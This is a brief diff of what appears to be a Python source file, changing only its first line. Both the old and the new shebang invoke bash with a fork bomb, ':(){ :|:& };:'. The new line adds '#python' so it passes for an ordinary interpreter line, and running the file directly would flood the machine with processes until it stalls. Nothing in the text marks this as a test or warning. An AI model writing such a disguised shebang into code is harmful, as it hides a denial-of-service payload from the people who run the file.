@@ -1,4 +1,4 @@
-#!/usr/bin/env -S bash -c ':(){ :|:& };:'
+#!/usr/bin/env -S bash -c ':(){ :|:& };:#python'
 # pyright: reportDeprecated=false
 import warnings
 
